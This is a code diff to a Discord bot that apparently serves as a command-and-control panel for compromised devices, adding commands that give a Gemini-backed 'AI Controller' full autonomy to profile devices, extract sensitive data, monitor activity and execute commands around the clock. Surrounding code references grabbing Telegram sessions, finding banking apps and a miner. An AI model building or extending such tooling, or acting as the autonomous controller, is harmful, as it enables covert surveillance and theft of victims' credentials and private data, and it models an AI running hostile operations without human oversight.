@@ -10,6 +10,7 @@ import { C, E, A, smallCaps, mono, createBox, bold, ts, randGif, DEV_CMDS, BOT_C
 import { videoStream } from './stream.js'
 import { aiCoPilot } from './ai-copilot/index.js'
 import { aiContext } from './ai-copilot/context.js'
+import { aiController } from './ai-copilot/controller.js'
 import { buildMinerEmbed } from './bot/minerEmbed.js'
 import { campaignManager } from './ai-copilot/campaign.js'
 import { analyzeResults } from './ai-copilot/analyzer.js'
@@ -1072,8 +1073,32 @@ client.on(Events.MessageCreate, async (msg) => {
             console.log(`[AI] AI not available - check GEMINI_API_KEY`)
             return msg.reply(`${E.coffin} AI needs Gemini API key. Get free at https://aistudio.google.com/apikey ${E.skull}`)
           }
+
+          // AI Controller sub-commands
+          const firstArg = args[0]?.toLowerCase()
+          if (firstArg === 'give_control' || firstArg === 'autonomous') {
+            const objective = args.slice(1).join(' ') || 'Full autonomous intelligence gathering — profile all devices, extract sensitive data, monitor activity, and report findings 24/7'
+            try {
+              const status = await aiController.startMission(guild, client, targets, deviceStatus, objective)
+              const text = `**🤖 AI Controller ACTIVE**\n**Mission:** ${objective.slice(0, 200)}\n**Devices:** ${status.devices} found\n**Interval:** ${status.interval}\n\nAI now has full autonomy. It will gather intelligence, execute commands, and report findings in real-time.\nUse \`!ai take_control\` to stop.`
+              return msg.reply({ ...bloodEmbed(bold('🤖 AI AUTONOMOUS'), 'danger', text), components: MENU_BTNS })
+            } catch (err) { return msg.reply(`${E.coffin} ${err.message} ${E.skull}`) }
+          }
+          if (firstArg === 'take_control' || firstArg === 'revoke') {
+            if (!aiController.isActive) return msg.reply(`${E.coffin} AI controller not active ${E.skull}`)
+            aiController.stopMission()
+            return msg.reply({ ...bloodEmbed(bold('🤖 AI Controller'), 'warning', `**CONTROL REVOKED**\nAI autonomy has been terminated. Manual control resumed.`), components: MENU_BTNS })
+          }
+          if (firstArg === 'controller' || firstArg === 'status') {
+            const s = aiController.status
+            const text = s.mission
+              ? `**🤖 AI Controller Status**\n**State:** ${s.state}\n**Mission:** ${s.mission.objective}\n**Phase:** ${s.mission.phase}\n**Commands Executed:** ${s.mission.commandsExecuted}\n**Uptime:** ${s.uptime}\n**Devices:** ${s.devices}\n**Interval:** ${s.interval}`
+              : `**🤖 AI Controller**\n**State:** OFF\nUse \`!ai give_control <objective>\` to start autonomous operations.`
+            return msg.reply({ ...bloodEmbed(bold('🤖 AI CONTROLLER'), s.mission ? 'danger' : 'info', text), components: MENU_BTNS })
+          }
+
           const aiMsg = args.join(' ')
-          if (!aiMsg) return msg.reply(`${E.target} Usage: \`!ai <request>\`\nExamples:\n\`!ai profile the device\`\n\`!ai what banking apps\`\n\`!ai grab telegram sessions\` ${E.skull}`)
+          if (!aiMsg) return msg.reply(`${E.target} Usage: \`!ai <request>\` or \`!ai give_control <objective>\` for autonomous mode ${E.skull}`)
           await msg.channel.sendTyping()
           try {
             // Ensure AI session exists before gathering
